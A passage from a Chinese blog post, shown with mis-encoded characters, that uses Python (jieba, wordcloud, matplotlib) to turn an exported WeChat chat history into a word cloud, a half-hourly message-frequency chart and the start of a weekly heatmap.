class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgSeq&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgStatus&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgVoiceText&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ¯”è¾ƒå€¼å¾—å…³æ³¨çš„å­—æ®µå¦‚ä¸‹ï¼š</p><ul><li>msgContentï¼šæ¶ˆæ¯å†…å®¹</li><li>msgCreateTimeï¼šæ¶ˆæ¯åˆ›å»ºæ—¶é—´ï¼Œä½¿ç”¨ Unix Time è¡¨ç¤º</li><li>messageTypeï¼šæ¶ˆæ¯ç±»å‹<ul><li>æ–‡æœ¬ï¼š1</li><li>å›¾ç‰‡ï¼š3</li><li>è¯­éŸ³ï¼š34</li><li>è§†é¢‘ï¼š43</li><li>è¡¨æƒ…åŒ…ï¼š47</li><li>ä½ç½®ï¼š48</li><li>åˆ†äº«æ¶ˆæ¯ï¼š49</li><li>ç³»ç»Ÿæ¶ˆæ¯ï¼š10000</li></ul></li><li>msgStatusï¼šæ¶ˆæ¯çŠ¶æ€<ul><li>æ”¶åˆ°æ¶ˆæ¯ï¼š4</li><li>å‘å‡ºæ¶ˆæ¯ï¼š2ã€3</li></ul></li><li>msgVoiceTextï¼šå¾®ä¿¡çš„è¯­éŸ³è½¬æ–‡å­—è¯†åˆ«ç»“æœ</li></ul><p>å‰ç½®çŸ¥è¯†æœ‰äº†ï¼Œå°±å¯ä»¥å¼€å§‹åŠ¨æ‰‹å†™ä»£ç äº†ã€‚åˆ¶ä½œè¯äº‘å›¾ç‰‡ï¼Œåªéœ€è¦æå–å‡ºæ‰€æœ‰ messageType ç­‰äº 1 çš„è®°å½•ï¼Œå¹¶æŠŠè¿™äº›èŠå¤©è®°å½•è¿›è¡Œåˆ†è¯ä¹‹åï¼Œå°±å¯ä»¥åˆ¶ä½œè¯äº‘äº†ã€‚</p><p>é‚£ä¹ˆæ–°çš„é—®é¢˜æ¥äº†ï¼Œå¦‚ä½•å¿«é€Ÿæ‰¾åˆ°é‚£ä¸ªå¥½å‹&#x2F;ç¾¤èŠå¯¹åº”çš„ JSON æ–‡ä»¶ï¼Ÿä½¿ç”¨ grep å‘½ä»¤å³å¯ã€‚æ‰¾åˆ°æƒ³è¦ç”Ÿæˆè¯äº‘çš„ç¾¤èŠï¼Œä»»æ„é€‰æ‹©ä¸€å¥èŠå¤©è®°å½•ï¼Œåªè¦å’Œåˆ«çš„ç¾¤æœ‰ä¸€å®šåŒºåˆ†åº¦å³å¯ã€‚ä¾‹å¦‚ï¼š</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022172215934.png" alt="èŠå¤©è®°å½•"></p><p>ä½¿ç”¨grepå‘½ä»¤æŸ¥è¯¢</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022172326028.png" alt="grep"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„è·¯å¾„</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022172418945.png" alt="æ–‡ä»¶è·¯å¾„"></p><h3><span id="ç”Ÿæˆè¯äº‘å›¾">ç”Ÿæˆè¯äº‘å›¾</span></h3><p>æˆ‘ä»¬å…ˆå†™ä¸ªä»£ç å¤„ç†ä¸€ä¸‹è¯äº‘å›¾ã€‚</p><ol><li><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦èƒ½å¤Ÿè¯»å–èŠå¤©è®°å½•é‡Œçš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨jsonæ¥è¯»å–ã€‚</p></li><li><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬éœ€è¦æŠŠèŠå¤©è®°å½•é‡Œé¢çš„å¥å­åˆ‡å‰²æˆå„ä¸ªå•è¯ï¼Œè¿˜éœ€è¦å‰”é™¤æ²¡æœ‰æ„ä¹‰çš„å­—ç¬¦ï¼Œä¾‹å¦‚ï¼šå•Šã€å§ã€å‘¢å’Œå—ç­‰ç­‰ç­‰ã€‚åŒæ—¶è¿˜éœ€è¦å±è”½æ‰å¾®ä¿¡çš„è¡¨æƒ…åŒ…ï¼Œå¾®ä¿¡çš„è¡¨æƒ…åŒ…æœ‰å°†è¿‘ 50 ä¸ªé»˜è®¤è¡¨æƒ…åŒ…ï¼Œè‡ªå·±ä¸€ä¸ªä¸ªå»ç»Ÿè®¡å²‚ä¸æ˜¯å¤ªéº»çƒ¦äº†ï¼Ÿç®€å•ç²—æš´ä¸€ç‚¹çš„åŠæ³•å°±æ˜¯ç›´æ¥ä¸Šï¼ŒæŠŠå¾®ä¿¡é»˜è®¤çš„è¡¨æƒ…éƒ½æŒ‰ä¸€éè¿‡å»ã€‚å‘ç»™è‡ªå·±ï¼Œç„¶åæ‹·è´å‡ºæ¥ã€‚ä½¿ç”¨ sed å‘½ä»¤å¤„ç†ä¸€ä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚</p><p><code>pbpaste|sed &quot;s|\]\[|&#39;,&#39;|g ; s|\[|\[&#39;| ; s|\]|&#39;\]|&quot;</code></p><p>ä¹Ÿå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åšã€‚</p></li><li><p>ä¸ºäº†ç¾è§‚ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è®¾ç½®èƒŒæ™¯å›¾ç‰‡ï¼Œé€šè¿‡<code>mask</code>å‚æ•°è®¾ç½®</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># å¼•å…¥ç»“å·´åˆ†è¯ï¼Œå¯¹ç¾¤èŠè®°å½•è¿›è¡Œåˆ†è¯</span></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="comment"># å¼•å…¥è¯äº‘</span></span><br><span class="line"><span class="keyword">import</span> wordcloud</span><br><span class="line"><span class="comment"># å¼•å…¥åœæ­¢è¯æ¨¡å—</span></span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud, STOPWORDS</span><br><span class="line"><span class="comment"># å¼•å…¥ imageio è¯»å–çˆ±å¿ƒå›¾ç‰‡æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">from</span> imageio.v2 <span class="keyword">import</span> imread</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;/Users/disda/Desktop/Proj/wechat/db5/Chat_f611156ea3b00eb663747961911867d4.json&#x27;</span>).read()</span><br><span class="line">data = json.loads(data)</span><br><span class="line"></span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> (item[<span class="string">&#x27;messageType&#x27;</span>] == <span class="number">1</span>):</span><br><span class="line">        message = item[<span class="string">&#x27;msgContent&#x27;</span>].split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        content += message[<span class="number">0</span>] + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">ls = jieba.lcut(content)</span><br><span class="line"><span class="comment"># å¦‚æœåˆ†è¯å‡ºæ¥åªæœ‰ä¸€ä¸ªå­—ç¬¦å‰”é™¤è¿™ä¸ªå­—ç¬¦</span></span><br><span class="line">ls = [i <span class="keyword">for</span> i <span class="keyword">in</span> ls <span class="keyword">if</span> <span class="built_in">len</span>(i) &gt; <span class="number">1</span>]</span><br><span class="line">text = <span class="string">&#x27; &#x27;</span>.join(ls)</span><br><span class="line"></span><br><span class="line">stopwords = STOPWORDS</span><br><span class="line"><span class="comment"># æ·»åŠ æ–°çš„åœæ­¢è¯</span></span><br><span class="line">stopwords.update(</span><br><span class="line">    [<span class="string">&#x27;å¾®ç¬‘&#x27;</span>, <span class="string">&#x27;æ’‡å˜´&#x27;</span>, <span class="string">&#x27;è‰²&#x27;</span>, <span class="string">&#x27;å‘å‘†&#x27;</span>, <span class="string">&#x27;å¾—æ„&#x27;</span>, <span class="string">&#x27;æµæ³ª&#x27;</span>, <span class="string">&#x27;å®³ç¾&#x27;</span>, <span class="string">&#x27;é—­å˜´&#x27;</span>, <span class="string">&#x27;ç¡&#x27;</span>, <span class="string">&#x27;å¤§å“­&#x27;</span>, <span class="string">&#x27;å°´å°¬&#x27;</span>, <span class="string">&#x27;å‘æ€’&#x27;</span>, <span class="string">&#x27;è°ƒçš®&#x27;</span>, <span class="string">&#x27;å‘²ç‰™&#x27;</span>, <span class="string">&#x27;æƒŠè®¶&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;éš¾è¿‡&#x27;</span>, <span class="string">&#x27;å›§&#x27;</span>, <span class="string">&#x27;æŠ“ç‹‚&#x27;</span>, <span class="string">&#x27;å&#x27;</span>, <span class="string">&#x27;å·ç¬‘&#x27;</span>, <span class="string">&#x27;æ„‰å¿«&#x27;</span>, <span class="string">&#x27;ç™½çœ¼&#x27;</span>, <span class="string">&#x27;å‚²æ…¢&#x27;</span>, <span class="string">&#x27;å›°&#x27;</span>, <span class="string">&#x27;æƒŠæ&#x27;</span>, <span class="string">&#x27;æ†¨ç¬‘&#x27;</span>, <span class="string">&#x27;æ‚ é—²&#x27;</span>, <span class="string">&#x27;å’’éª‚&#x27;</span>, <span class="string">&#x27;ç–‘é—®&#x27;</span>, <span class="string">&#x27;å˜˜&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;æ™•&#x27;</span>, <span class="string">&#x27;è¡°&#x27;</span>, <span class="string">&#x27;éª·é«…&#x27;</span>, <span class="string">&#x27;æ•²æ‰“&#x27;</span>, <span class="string">&#x27;å†è§&#x27;</span>, <span class="string">&#x27;æ“¦æ±—&#x27;</span>, <span class="string">&#x27;æŠ é¼»&#x27;</span>, <span class="string">&#x27;é¼“æŒ&#x27;</span>, <span class="string">&#x27;åç¬‘&#x27;</span>, <span class="string">&#x27;å³å“¼å“¼&#x27;</span>, <span class="string">&#x27;é„™è§†&#x27;</span>, <span class="string">&#x27;å§”å±ˆ&#x27;</span>, <span class="string">&#x27;å¿«å“­äº†&#x27;</span>, <span class="string">&#x27;é˜´é™©&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;äº²äº²&#x27;</span>, <span class="string">&#x27;å¯æ€œ&#x27;</span>, <span class="string">&#x27;ç¬‘è„¸&#x27;</span>, <span class="string">&#x27;ç”Ÿç—…&#x27;</span>, <span class="string">&#x27;è„¸çº¢&#x27;</span>, <span class="string">&#x27;ç ´æ¶•ä¸ºç¬‘&#x27;</span>, <span class="string">&#x27;ææƒ§&#x27;</span>, <span class="string">&#x27;å¤±æœ›&#x27;</span>, <span class="string">&#x27;æ— è¯­&#x27;</span>, <span class="string">&#x27;å˜¿å“ˆ&#x27;</span>, <span class="string">&#x27;æ‚è„¸&#x27;</span>, <span class="string">&#x27;å¥¸ç¬‘&#x27;</span>, <span class="string">&#x27;æœºæ™º&#x27;</span>, <span class="string">&#x27;çš±çœ‰&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;è€¶&#x27;</span>, <span class="string">&#x27;åƒç“œ&#x27;</span>, <span class="string">&#x27;åŠ æ²¹&#x27;</span>, <span class="string">&#x27;æ±—&#x27;</span>, <span class="string">&#x27;å¤©å•Š&#x27;</span>, <span class="string">&#x27;Emm&#x27;</span>, <span class="string">&#x27;ç¤¾ä¼šç¤¾ä¼š&#x27;</span>, <span class="string">&#x27;æ—ºæŸ´&#x27;</span>, <span class="string">&#x27;å¥½çš„&#x27;</span>, <span class="string">&#x27;æ‰“è„¸&#x27;</span>, <span class="string">&#x27;å“‡&#x27;</span>, <span class="string">&#x27;ç¿»ç™½çœ¼&#x27;</span>, <span class="string">&#x27;666&#x27;</span>, <span class="string">&#x27;è®©æˆ‘çœ‹çœ‹&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;å¹æ°”&#x27;</span>, <span class="string">&#x27;è‹¦æ¶©&#x27;</span>, <span class="string">&#x27;è£‚å¼€&#x27;</span>, <span class="string">&#x27;å˜´å”‡&#x27;</span>, <span class="string">&#x27;çˆ±å¿ƒ&#x27;</span>, <span class="string">&#x27;å¿ƒç¢&#x27;</span>, <span class="string">&#x27;æ‹¥æŠ±&#x27;</span>, <span class="string">&#x27;å¼º&#x27;</span>, <span class="string">&#x27;å¼±&#x27;</span>, <span class="string">&#x27;æ¡æ‰‹&#x27;</span>, <span class="string">&#x27;èƒœåˆ©&#x27;</span>, <span class="string">&#x27;æŠ±æ‹³&#x27;</span>, <span class="string">&#x27;å‹¾å¼•&#x27;</span>, <span class="string">&#x27;æ‹³å¤´&#x27;</span>, <span class="string">&#x27;OK&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;åˆå&#x27;</span>, <span class="string">&#x27;å•¤é…’&#x27;</span>, <span class="string">&#x27;å’–å•¡&#x27;</span>, <span class="string">&#x27;è›‹ç³•&#x27;</span>, <span class="string">&#x27;ç«ç‘°&#x27;</span>, <span class="string">&#x27;å‡‹è°¢&#x27;</span>, <span class="string">&#x27;èœåˆ€&#x27;</span>, <span class="string">&#x27;ç‚¸å¼¹&#x27;</span>, <span class="string">&#x27;ä¾¿ä¾¿&#x27;</span>, <span class="string">&#x27;æœˆäº®&#x27;</span>, <span class="string">&#x27;å¤ªé˜³&#x27;</span>, <span class="string">&#x27;åº†ç¥&#x27;</span>, <span class="string">&#x27;ç¤¼ç‰©&#x27;</span>, <span class="string">&#x27;çº¢åŒ…&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;ç™¼&#x27;</span>, <span class="string">&#x27;ç¦&#x27;</span>, <span class="string">&#x27;çƒŸèŠ±&#x27;</span>, <span class="string">&#x27;çˆ†ç«¹&#x27;</span>, <span class="string">&#x27;çŒªå¤´&#x27;</span>, <span class="string">&#x27;è·³è·³&#x27;</span>, <span class="string">&#x27;å‘æŠ–&#x27;</span>, <span class="string">&#x27;è½¬åœˆ&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–çˆ±å¿ƒå›¾ç‰‡æ–‡ä»¶å¹¶èµ‹å€¼ç»™ background å˜é‡</span></span><br><span class="line">background = imread(<span class="string">&#x27;heart.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wc = wordcloud.WordCloud(</span><br><span class="line">    font_path=<span class="string">&quot;SIMSUN.ttf&quot;</span>,</span><br><span class="line">    width=<span class="number">1000</span>,</span><br><span class="line">    height=<span class="number">1000</span>,</span><br><span class="line">    <span class="comment"># æ›¿æ¢ skyblue ä¸º hexcode å¯ä»¥è®¾ç½®ä»»æ„èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">    background_color=<span class="string">&quot;skyblue&quot;</span>,</span><br><span class="line">    max_words=<span class="number">200</span>,</span><br><span class="line">    <span class="comment"># é…ç½®åœæ­¢è¯å‚æ•°</span></span><br><span class="line">    stopwords=stopwords,</span><br><span class="line">    <span class="comment"># é…ç½®çˆ±å¿ƒå›¾ç‰‡é®ç½©</span></span><br><span class="line">    mask=background</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">wc.generate(text)</span><br><span class="line">wc.to_file(<span class="string">&quot;resultHeart.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/resultHeart1.png" alt="resultHeart"></p><p>å…¶ä¸­<code>background_color,</code>å¯ä»¥æ”¹æˆä»»æ„rgbï¼Œä¾‹å¦‚<code>background_color=&quot;#f0c9cf&quot;</code></p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/resultHeart3_1.png" alt="resultHeart"></p><h3><span id="è¡¨æƒ…åŒ…ç»Ÿè®¡">è¡¨æƒ…åŒ…ç»Ÿè®¡</span></h3><p>æœ¬æ¥æƒ³<a href="https://worditout.com/%E6%9D%A5%E7%94%9F%E6%88%90Emoji%E7%BB%9F%E8%AE%A1%E5%9B%BE%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E5%BE%AE%E4%BF%A1%E7%9A%84Emoji%E9%83%BD%E6%98%AF%E8%87%AA%E5%88%B6%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E6%B2%A1%E5%8A%9E%E6%B3%95%E7%BB%9F%E8%AE%A1%E5%87%BA%E6%9D%A5%EF%BC%8CEmoji%E5%A5%BD%E5%83%8Fmatplotlib%E4%B9%9F%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5">https://worditout.com/æ¥ç”ŸæˆEmojiç»Ÿè®¡å›¾çš„ï¼Œä½†æ˜¯å¾®ä¿¡çš„Emojiéƒ½æ˜¯è‡ªåˆ¶çš„ï¼Œæ‰€ä»¥æ²¡åŠæ³•ç»Ÿè®¡å‡ºæ¥ï¼ŒEmojiå¥½åƒmatplotlibä¹Ÿæ˜¾ç¤ºä¸å‡ºæ¥</a></p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231023161816052.png" alt="matplotlib"></p><p>è¢«è¿«ç”¨Excelç”»äº†ä¸€ä¸‹</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231023160911328.png" alt="excelå›¾"></p><h3><span id="æ—¶é—´åˆ†æ®µèŠå¤©é¢‘ç‡åˆ†æ">æ—¶é—´åˆ†æ®µèŠå¤©é¢‘ç‡åˆ†æ</span></h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»Ÿè®¡æ¯å¤©å„ä¸ªæ—¶é—´æ®µçš„èŠå¤©è®°å½•æ•°é‡å¯¹èŠå¤©è®°å½•è¿›è¡Œåˆ†æï¼Œ</p><p>é€šè¿‡æ‰‹åŠ¨åˆ†ç®±æ“ä½œï¼Œæ¯éš”åŠå°æ—¶åˆ†ä¸€ä¸ªç®±ã€‚ç„¶åä½¿ç”¨matplotlibä¸­çš„ğŸ“Šæ¥æ˜¾ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;/Users/disda/Desktop/Proj/wechat/db5/Chat_f611156ea3b00eb663747961911867d4.json&#x27;</span>).read()</span><br><span class="line">data = json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    <span class="comment"># è·å–æ¶ˆæ¯å‘é€æ—¶é—´</span></span><br><span class="line">    unixtime = (item[<span class="string">&#x27;msgCreateTime&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(unixtime, <span class="built_in">int</span>):</span><br><span class="line">        value = datetime.datetime.fromtimestamp(unixtime).strftime(<span class="string">&#x27;%H:%M&#x27;</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœåˆ†é’Ÿæ•°å°äº 30 åˆ™æŠŠåä¸¤ä½å˜æˆ 00</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(value[<span class="number">3</span>:]) &lt; <span class="number">30</span>:</span><br><span class="line">        value = value[:<span class="number">2</span>]+<span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="comment"># å¦‚æœåˆ†é’Ÿæ•°å¤§äº 30 åˆ™æŠŠåä¸¤ä½å˜æˆ 30</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = value[:<span class="number">2</span>]+<span class="string">&#x27;30&#x27;</span></span><br><span class="line">        <span class="comment"># å¦‚æœå­˜åœ¨è¿™ä¸ªæ—¶é—´ç‚¹å°±æŠŠè®¡æ•° +1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">dict</span>.get(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">dict</span>[value] = <span class="built_in">dict</span>.get(value)+<span class="number">1</span></span><br><span class="line">        <span class="comment"># å¦‚æœä¸å­˜åœ¨è¿™ä¸ªæ—¶é—´ç‚¹å°±åˆå§‹åŒ–è®¡æ•° = 1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">dict</span>[value] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹å¯¹ dict æ—¶åˆ»åˆ†åŒºç»“æœæ’åº</span></span><br><span class="line">sort_result = <span class="built_in">sorted</span>(<span class="built_in">dict</span>.items(), key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># å­˜å‚¨æ’åºä¹‹åçš„ç»“æœ</span></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sort_result:</span><br><span class="line">    result[item[<span class="number">0</span>]] = item[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">axis_x=[i[:<span class="number">2</span>]+<span class="string">&#x27;\nç‚¹\n&#x27;</span>+i[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> result]</span><br><span class="line">axis_y=[result[i] <span class="keyword">for</span> i <span class="keyword">in</span> result]</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">16</span>,<span class="number">9</span>))</span><br><span class="line">plt.bar(axis_x,axis_y)</span><br><span class="line">plt.xlabel(<span class="string">&quot;æ—¶é—´æ®µ&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;æ¶ˆæ¯æ•°é‡&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;å’Œå®å®èŠå¤©å“’æ—¶åŒºå›¾&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231023161947587.png" alt="æ—¶åŒºå›¾"></p><h2><span id="èŠå¤©é¢‘ç‡çƒ­å›¾åˆ†æ">èŠå¤©é¢‘ç‡çƒ­å›¾åˆ†æ</span></h2><p>æœ€åè¿˜å¯ä»¥é€šè¿‡çƒ­åŠ›å›¾æ¥åˆ†æèŠå¤©çš„æ•°æ®ï¼Œæˆ‘ä»¬çŸ¥é“pythonä¸‹æ ‡ä»0å¼€å§‹ï¼Œå› æ­¤ç¬¬ä¸€å‘¨å°±ç”¨0è¡¨ç¤ºï¼Œä¸ç¬¦åˆæˆ‘ä»¬ä½¿ç”¨ä¹ æƒ¯ï¼Œæˆ‘ä»¬æå–å‘¨æ•°ç„¶åè¿›è¡Œï¼‹1æ“ä½œå³å¯ï¼ŒåŒç†Pythonä¸­å‘¨ä¸€ä¹Ÿç”¨0è¡¨ç¤ºï¼Œä¸€å¹¶åŠ ä¸€æ“ä½œå³å¯ã€‚ç„¶åå¾ªç¯ç»Ÿè®¡æ¯å‘¨ç»“æœï¼Œé€šè¿‡matplotlibç”»å›¾å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mplfonts <span class="keyword">import</span> use_font</span><br><span class="line"><span class="comment"># å¯¼å…¥ SimHei å­—ä½“ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨è¯·åœ¨é¡¹ç›®ç›®å½•ä¸­ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯¼å…¥</span></span><br><span class="line"><span class="comment"># mplfonts init &amp;&amp; mplfonts install --update SimHei.ttf</span></span><br><span class="line">use_font(<span class="string">&#x27;SimHei&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;/Users/disda/Desktop/Proj/wechat/db5/Chat_f611156ea3b00eb663747961911867d4.json&#x27;</span>).read()</span><br><span class="line">data = json.loads(data)</span><br><span class="line"></span><br><span class="line">statistics_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">unixtime = item.get(<span class="string">&#x27;msgCreateTime&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(unixtime, <span class="built_in">int</span>):</span><br><span class="line"><span class="comment"># key æ ¼å¼ï¼šå¹´ä»½.å‘¨</span></span><br><span class="line">week = <span class="built_in">str</span>(<span class="built_in">int</span>(datetime.datetime.fromtimestamp(unixtime).strftime(<span class="string">&#x27;%Y%W&#x27;</span>)) + <span class="number">1</span>)</span><br><span class="line">week = week[:<span class="number">4</span>]+<span 